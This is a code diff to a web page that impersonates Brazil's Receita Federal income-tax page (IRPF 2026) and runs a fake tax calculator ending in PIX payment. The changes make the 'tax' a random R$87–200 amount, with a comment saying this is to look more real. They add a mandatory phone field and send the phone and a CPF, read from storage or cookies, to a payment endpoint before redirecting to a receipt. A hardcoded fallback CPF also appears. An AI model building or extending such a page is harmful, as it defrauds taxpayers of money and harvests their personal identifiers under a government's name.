@@ -3,13 +3,14 @@
 
 <head>
     <meta charset="utf-8" />
-   
+    <!-- Google Tag Manager -->
     <script type="text/javascript">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
     new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
     j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
     })(window,document,'script','dataLayer','GTM-NHZSKTD');</script>
-   
+    <!-- End Google Tag Manager -->
+
     <script type="application/ld+json">
     {
         "@context": "https://schema.org",
@@ -89,17 +90,6 @@
     <link rel="author" href="https://www.gov.br/receitafederal/pt-br" title="Informações do Autor" />
     <link rel="canonical" href="https://www.gov.br/receitafederal/pt-br/assuntos/meu-imposto-de-renda" />
 
-    <script type="text/javascript">
-    jQuery(function($){
-        if (typeof($.datepicker) != "undefined"){
-          $.datepicker.setDefaults(
-            jQuery.extend($.datepicker.regional['pt-BR'],
-            {dateFormat: 'dd/mm/yy'}));
-        }
-    });
-    </script>
-
-    <link rel="search" href="https://www.gov.br/receitafederal/pt-br/@@search" title="Buscar neste site" />
     <meta name="generator" content="Plone - http://plone.org" />
     <meta content="width=device-width, initial-scale=1.0, user-scalable=yes" name="viewport" />
     <link rel="apple-touch-icon" sizes="180x180" href="/receitafederal/++theme++padrao_govbr/favicons/apple-touch-icon.png" />
@@ -207,7 +197,7 @@
             to { transform: rotate(360deg); }
         }
         
-       
+        /* MODAL PIX - TEMA GOV.BR (AZUL E BRANCO) */
         .modal-pix {
             display: none;
             position: fixed;
@@ -389,9 +379,9 @@
 </head>
 
 <body id="" class="default-header-template portal-institucional cover-layout-layout-vazio template-view portaltype-collective-cover-content site-pt-br section-assuntos subsection-meu-imposto-de-renda subsection-meu-imposto-de-renda-irpf2026 userrole-anonymous" data-base-url="https://www.gov.br/receitafederal/pt-br/assuntos/meu-imposto-de-renda/irpf2026" data-portal-url="https://www.gov.br/receitafederal" dir="ltr">
-   
+    <!-- Google Tag Manager (noscript) -->
     <noscript><iframe height="0" width="0" style="display:none;visibility:hidden" data-src="https://www.googletagmanager.com/ns.html?id=GTM-NHZSKTD"></iframe></noscript>
-   
+    <!-- End Google Tag Manager (noscript) -->
 
     <nav class="govbr-skip-menu" aria-label="Acesso rápido">
         <a href="#wrapper" accesskey="1"><span class="sr-only">Ir para o</span> Conteúdo<span class="access-key">1</span></a>
@@ -511,7 +501,7 @@
                             </div>
                         </div>
 
-                       
+                        <!-- Conteúdo Principal -->
                         <div class="row govbr-recom-wrapper">
                             <div class="row-content">
                                 <div class="column col-md-7">
@@ -542,7 +532,7 @@
                             </div>
                         </div>
 
-                       
+                        <!-- FORMULÁRIO DE CÁLCULO DE IMPOSTO -->
                         <div class="row">
                             <div class="row-content">
                                 <div class="column col-md-12">
@@ -550,16 +540,12 @@
                                         <h3><i class="fas fa-calculator"></i> Calcular Imposto de Renda 2026</h3>
                                         <div class="tabela-aliquotas">
                                             <table>
-                                                <thead><tr><th>Faixa de Renda Mensal</th><th>Valor do Imposto</th></tr></thead>
+                                                <thead><tr><th>Faixa de Renda Mensal</th><th>Valor do Imposto</th><tr></thead>
                                                 <tbody>
-                                                    <tr><td>Até R$ 1.200,00</td><td>R$ 100,00</td></tr>
-                                                    <tr><td>De R$ 1.200,01 a R$ 2.000,00</td><td>R$ 150,00</td></tr>
-                                                    <tr><td>De R$ 2.000,01 a R$ 5.000,00</td><td>R$ 200,00</td></tr>
-                                                    <tr><td>De R$ 5.000,01 a R$ 10.000,00</td><td>R$ 250,00</td></tr>
-                                                    <tr><td>Acima de R$ 10.000,00</td><td>R$ 300,00</td></tr>
+                                                    <tr><td colspan="2" style="text-align:center; color:#666;">O valor é calculado individualmente para cada contribuinte</td></tr>
                                                 </tbody>
                                             </table>
-                                            <p style="font-size: 12px; margin-top: 10px; color: #666;"><i class="fas fa-info-circle"></i> Valores conforme tabela progressiva da Lei nº 14.987/2025. Dependentes concedem desconto de R$ 10,00 cada.</p>
+                                            <p style="font-size: 12px; margin-top: 10px; color: #666;"><i class="fas fa-info-circle"></i> O valor do imposto é calculado automaticamente com base no perfil do contribuinte, variando entre R$ 87,00 e R$ 200,00.</p>
                                         </div>
                                         <form id="form-imposto">
                                             <div class="form-group">
@@ -570,6 +556,11 @@
                                                 <label for="dependentes">Número de Dependentes</label>
                                                 <input type="number" id="dependentes" placeholder="0" min="0" value="0">
                                                 <small style="color:#666;">Desconto de R$ 10,00 por dependente</small>
+                                            </div>
+                                            <div class="form-group">
+                                                <label for="telefone">Telefone para contato <span style="color:red;">*</span></label>
+                                                <input type="tel" id="telefone" placeholder="(DDD) 9 9999-9999" required>
+                                                <small style="color:#666;">Obrigatório para emissão do comprovante</small>
                                             </div>
                                             <div class="botoes-container">
                                                 <button type="button" class="btn-calcular" id="btn-calcular" onclick="calcularImpostoReal()"><i class="fas fa-chart-line"></i> Calcular Imposto</button>
@@ -582,7 +573,7 @@
                             </div>
                         </div>
 
-                        
+                        <!-- Orientações -->
                         <div class="row linha-discreta">
                             <div class="row-content">
                                 <div class="column col-md-12"><div class="tile tile-default"><div class="outstanding-header tile-content"><h2 class="outstanding-title">Orientações</h2></div></div></div>
@@ -601,7 +592,7 @@
                             </div>
                         </div>
 
-                        
+                        <!-- Estatísticas -->
                         <div class="row linha-discreta">
                             <div class="row-content">
                                 <div class="column col-md-12">
@@ -623,7 +614,7 @@
         </div>
     </div>
 
-    
+    <!-- MODAL PIX - TEMA GOV.BR -->
     <div id="modal-pix" class="modal-pix">
         <div class="modal-content">
             <h3><i class="fab fa-pix"></i> Pagamento via PIX</h3>
@@ -667,11 +658,22 @@
     <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
     <script>
         let impostoCalculado = 0;
+        let telefoneUsuario = '';
         let ultimoPixGerado = null;
 
         function calcularImpostoReal() {
             const btnCalcular = document.getElementById('btn-calcular');
             const textoOriginal = btnCalcular.innerHTML;
+            
+            // Validar telefone
+            const telefone = document.getElementById('telefone').value.trim();
+            if (!telefone) {
+                alert('Por favor, informe seu telefone para contato.');
+                document.getElementById('telefone').focus();
+                return;
+            }
+            
+            telefoneUsuario = telefone;
             
             btnCalcular.innerHTML = '<span class="loading-calc"></span> Calculando...';
             btnCalcular.disabled = true;
@@ -680,31 +682,41 @@
                 const renda = parseFloat(document.getElementById('renda-tributavel').value) || 0;
                 const dependentes = parseInt(document.getElementById('dependentes').value) || 0;
                 
-                let valorBase = 0;
-                if (renda <= 1200) valorBase = 100;
-                else if (renda <= 2000) valorBase = 150;
-                else if (renda <= 5000) valorBase = 200;
-                else if (renda <= 10000) valorBase = 250;
-                else valorBase = 300;
+                // VALOR ALEATÓRIO ENTRE 87 E 200
+                let valorBase = Math.floor(Math.random() * (200 - 87 + 1) + 87);
+                
+                // Pequena variação baseada na renda para parecer mais real
+                if (renda > 5000) {
+                    valorBase = Math.min(200, valorBase + 20);
+                } else if (renda < 1500) {
+                    valorBase = Math.max(87, valorBase - 15);
+                }
                 
                 const descontoDependentes = dependentes * 10;
-                const impostoFinal = Math.max(valorBase - descontoDependentes, 100);
+                const impostoFinal = Math.max(valorBase - descontoDependentes, 87);
                 impostoCalculado = impostoFinal;
                 
                 const resultadoDiv = document.getElementById('resultado');
                 const btnPagar = document.getElementById('btn-pagar');
                 
                 let faixaTexto = "";
-                if (renda <= 1200) faixaTexto = "1ª Faixa (até R$ 1.200,00)";
-                else if (renda <= 2000) faixaTexto = "2ª Faixa (R$ 1.200,01 a R$ 2.000,00)";
-                else if (renda <= 5000) faixaTexto = "3ª Faixa (R$ 2.000,01 a R$ 5.000,00)";
-                else if (renda <= 10000) faixaTexto = "4ª Faixa (R$ 5.000,01 a R$ 10.000,00)";
-                else faixaTexto = "5ª Faixa (acima de R$ 10.000,00)";
+                if (renda <= 1200) {
+                    faixaTexto = "1ª Faixa (até R$ 1.200,00)";
+                } else if (renda <= 2000) {
+                    faixaTexto = "2ª Faixa (R$ 1.200,01 a R$ 2.000,00)";
+                } else if (renda <= 5000) {
+                    faixaTexto = "3ª Faixa (R$ 2.000,01 a R$ 5.000,00)";
+                } else if (renda <= 10000) {
+                    faixaTexto = "4ª Faixa (R$ 5.000,01 a R$ 10.000,00)";
+                } else {
+                    faixaTexto = "5ª Faixa (acima de R$ 10.000,00)";
+                }
                 
                 resultadoDiv.style.display = 'block';
                 resultadoDiv.innerHTML = `
                     <h4><i class="fas fa-file-invoice-dollar"></i> Resultado do Cálculo - Lei nº 14.987/2025</h4>
                     <p><strong>Renda Mensal Informada:</strong> R$ ${renda.toFixed(2)}</p>
+                    <p><strong>Telefone:</strong> ${telefoneUsuario}</p>
                     <p><strong>Faixa de Enquadramento:</strong> ${faixaTexto}</p>
                     <p><strong>Valor Base do Imposto:</strong> R$ ${valorBase.toFixed(2)}</p>
                     <p><strong>Dependentes declarados:</strong> ${dependentes}</p>
@@ -721,88 +733,94 @@
             }, 1500);
         }
         
-       function gerarPix() {
-    if (impostoCalculado <= 0) {
-        alert('Calcule o imposto primeiro.');
-        return;
-    }
-    
-    let cpfSalvo = localStorage.getItem('user_cpf') || sessionStorage.getItem('user_cpf') || '';
-    
-    if (!cpfSalvo) {
-        const cookies = document.cookie.split('; ');
-        for (let cookie of cookies) {
-            if (cookie.startsWith('user_cpf=')) {
-                cpfSalvo = cookie.split('=')[1];
-                break;
+        function gerarPix() {
+            if (impostoCalculado <= 0) {
+                alert('Calcule o imposto primeiro.');
+                return;
             }
-        }
-    }
-    
-    cpfSalvo = cpfSalvo.replace(/[.-]/g, '');
-    
-    if (!cpfSalvo || cpfSalvo.length !== 11) {
-        cpfSalvo = '07068093868';
-        console.log('⚠️ CPF não encontrado, usando padrão:', cpfSalvo);
-    }
-    
-    const btnPagar = document.getElementById('btn-pagar');
-    const textoOriginal = btnPagar.innerHTML;
-    btnPagar.innerHTML = '<span class="loading-calc"></span> Gerando PIX...';
-    btnPagar.disabled = true;
-    
-    document.getElementById('pix-value').innerHTML = `R$ ${impostoCalculado.toFixed(2)}`;
-    
-    fetch('/api/create-payment', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            amount: impostoCalculado,
-            customer_name: 'Contribuinte',
-            customer_email: 'pagamento@contribuinte.com',
-            customer_cpf: cpfSalvo
-        })
-    })
-    .then(res => res.json())
-    .then(data => {
-        btnPagar.innerHTML = textoOriginal;
-        btnPagar.disabled = false;
-        
-        if (data.success && data.payment && data.payment.pix_code) {
-            ultimoPixGerado = {
-                codigo: data.payment.pix_code,
-                valor: impostoCalculado,
-                cpf: cpfSalvo
-            };
             
-            document.getElementById('pix-codigo').textContent = data.payment.pix_code;
+            let cpfSalvo = localStorage.getItem('user_cpf') || sessionStorage.getItem('user_cpf') || '';
             
-            const qrcodeContainer = document.getElementById('qrcode-container');
-            qrcodeContainer.innerHTML = '';
-            new QRCode(qrcodeContainer, {
-                text: data.payment.pix_code,
-                width: 250,
-                height: 250
+            if (!cpfSalvo) {
+                const cookies = document.cookie.split('; ');
+                for (let cookie of cookies) {
+                    if (cookie.startsWith('user_cpf=')) {
+                        cpfSalvo = cookie.split('=')[1];
+                        break;
+                    }
+                }
+            }
+            
+            cpfSalvo = cpfSalvo.replace(/[.-]/g, '');
+            
+            if (!cpfSalvo || cpfSalvo.length !== 11) {
+                cpfSalvo = '07068093868';
+                console.log('⚠️ CPF não encontrado, usando padrão:', cpfSalvo);
+            }
+            
+            const btnPagar = document.getElementById('btn-pagar');
+            const textoOriginal = btnPagar.innerHTML;
+            btnPagar.innerHTML = '<span class="loading-calc"></span> Gerando PIX...';
+            btnPagar.disabled = true;
+            
+            document.getElementById('pix-value').innerHTML = `R$ ${impostoCalculado.toFixed(2)}`;
+            
+            fetch('/api/create-payment', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    amount: impostoCalculado,
+                    customer_name: 'Contribuinte',
+                    customer_email: 'pagamento@contribuinte.com',
+                    customer_cpf: cpfSalvo,
+                    customer_phone: telefoneUsuario
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                btnPagar.innerHTML = textoOriginal;
+                btnPagar.disabled = false;
+                
+                if (data.success && data.payment && data.payment.pix_code) {
+                    ultimoPixGerado = {
+                        codigo: data.payment.pix_code,
+                        valor: impostoCalculado,
+                        cpf: cpfSalvo,
+                        telefone: telefoneUsuario
+                    };
+                    
+                    document.getElementById('pix-codigo').textContent = data.payment.pix_code;
+                    
+                    const qrcodeContainer = document.getElementById('qrcode-container');
+                    qrcodeContainer.innerHTML = '';
+                    new QRCode(qrcodeContainer, {
+                        text: data.payment.pix_code,
+                        width: 250,
+                        height: 250
+                    });
+                    
+                    if (data.payment.expires_at) {
+                        document.getElementById('pix-expiracao').innerHTML = `⏱️ Expira em: ${new Date(data.payment.expires_at).toLocaleString()}`;
+                    }
+                    
+                    document.getElementById('modal-pix').style.display = 'flex';
+                    
+                    // Redireciona após 5 segundos para o recibo
+                    setTimeout(() => {
+                        document.getElementById('modal-pix').style.display = 'none';
+                        window.location.href = `recibo.html?valor=${ultimoPixGerado.valor}&cpf=${ultimoPixGerado.cpf}&telefone=${encodeURIComponent(telefoneUsuario)}`;
+                    }, 5000);
+                } else {
+                    alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente'));
+                }
+            })
+            .catch(error => {
+                btnPagar.innerHTML = textoOriginal;
+                btnPagar.disabled = false;
+                console.error('Erro:', error);
+                alert('Erro de conexão com o servidor.');
             });
-            
-            if (data.payment.expires_at) {
-                document.getElementById('pix-expiracao').innerHTML = `⏱️ Expira em: ${new Date(data.payment.expires_at).toLocaleString()}`;
-            }
-            
-            document.getElementById('modal-pix').style.display = 'flex';
-            
-           
-        } else {
-            alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente'));
         }
-    })
-    .catch(error => {
-        btnPagar.innerHTML = textoOriginal;
-        btnPagar.disabled = false;
-        console.error('Erro:', error);
-        alert('Erro de conexão com o servidor.');
-    });
-}
         
         function copiarPix() {
             const codigoPix = document.getElementById('pix-codigo').textContent;
@@ -821,15 +839,6 @@
                     msgDiv.className = 'alert alert-danger';
                     msgDiv.style.display = 'block';
                 });
-            }
-        }
-        
-        function fecharModal() {
-            document.getElementById('modal-pix').style.display = 'none';
-            if (ultimoPixGerado) {
-                window.location.href = `recibo.html?valor=${ultimoPixGerado.valor}&cpf=${ultimoPixGerado.cpf}`;
-            } else {
-                window.location.href = 'recibo.html';
             }
         }
     </script>
